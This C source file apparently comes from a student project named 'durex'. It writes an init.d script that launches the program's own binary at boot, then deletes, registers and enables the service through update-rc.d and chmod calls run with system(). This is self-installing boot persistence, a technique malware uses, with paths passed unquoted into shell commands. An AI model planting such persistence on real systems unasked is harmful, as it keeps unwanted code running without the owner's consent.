/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/17 03:24:42 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/17 03:24:48 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Return the raw data of the service
*/
static char			*get_service_raw(t_durex *durex)
{
	char	*raw = ft_strnew(SERVICE_RAW_LEN);

	ft_strcat(raw, "#!/bin/sh\n");
	ft_strcat(raw, "### BEGIN INIT INFO\n");
	ft_strcat(raw, "# Provides:          <NAME>\n");
	ft_strcat(raw, "# Required-Start:    $local_fs $network $named $time $syslog\n");
	ft_strcat(raw, "# Required-Stop:     $local_fs $network $named $time $syslog\n");
	ft_strcat(raw, "# Default-Start:     2 3 4 5\n");
	ft_strcat(raw, "# Default-Stop:      0 1 6\n");
	ft_strcat(raw, "# Description:       <DESCRIPTION>\n");
	ft_strcat(raw, "### END INIT INFO\n");
	ft_strcat(raw, "start() {\n");
	ft_strcat(raw, " ");
	ft_strcat(raw, durex->current_path);
	ft_strcat(raw, "\n");
	ft_strcat(raw, "}\n");
	ft_strcat(raw, "\n");
	ft_strcat(raw, "stop() {\n");
	ft_strcat(raw, "	killall ");
	ft_strcat(raw, durex->current_path);
	ft_strcat(raw, "\n");
	ft_strcat(raw, "}\n");
	ft_strcat(raw, "\n");
	ft_strcat(raw, "case \"$1\" in\n");
	ft_strcat(raw, "start)\n");
	ft_strcat(raw, "start\n");
	ft_strcat(raw, ";;\n");
	ft_strcat(raw, "stop)\n");
	ft_strcat(raw, "stop\n");
	ft_strcat(raw, ";;\n");
	ft_strcat(raw, "restart)\n");
	ft_strcat(raw, "stop\n");
	ft_strcat(raw, "start\n");
	ft_strcat(raw, ";;\n");
	ft_strcat(raw, "*)\n");
	ft_strcat(raw, "echo \"Usage: $0 {start|stop|restart}\"\n");
	ft_strcat(raw, "esac\n");
	return (raw);
}

/*
**	Delete the service in case it was already there
*/
static void			delete_service(char *service_name, char *service_path)
{
	char		delete[BUFFER_LEN];

	snprintf(delete, BUFFER_LEN - 1, "update-rc.d -f %s remove", service_name);
	system((char*)&delete);
	unlink(service_path);
}

/*
**	Set the chmod for the file after we created it
*/
static void			set_chmod(char *path)
{
	char	chmod[BUFFER_LEN];

	snprintf(chmod, BUFFER_LEN - 1, "chmod +x %s", path);
	system((char*)&chmod);
}

/*
**	Create the service
*/
static void			create_service(char *name)
{
	char	create[BUFFER_LEN];

	snprintf(create, BUFFER_LEN - 1, "update-rc.d %s defaults", name);
	system((char*)&create);
}


/*
**	Enable the service
*/
static void			enable_service(char *name)
{
	char	enable[BUFFER_LEN];

	snprintf(enable, BUFFER_LEN - 1, "update-rc.d %s enable", name);
	system(enable);
}

/*
**	Write the service and config it
*/
static void			add_service(char *raw, char *name, char *path)
{
	int		fd			= 0;

	if ((fd = open(path, O_RDWR | O_CREAT)) > 0) {
		write(fd, raw, ft_strlen(raw));
		close(fd);

		set_chmod(path);
		create_service(name);
		enable_service(name);
	}
}


/*
**	Init the daemon at the boot of the server with a service
*/
void				init_daemon_service(t_durex *durex)
{
	char	*service_raw	= get_service_raw(durex);
	char	service_name[]	= "durex";
	char	service_path[BUFFER_LEN];

	snprintf(service_path, BUFFER_LEN - 1, "/etc/init.d/%s", (char*)&service_name);
	delete_service((char*)&service_name, service_path);
	add_service(service_raw, service_name, service_path);
	ft_strdel(&service_raw);
}
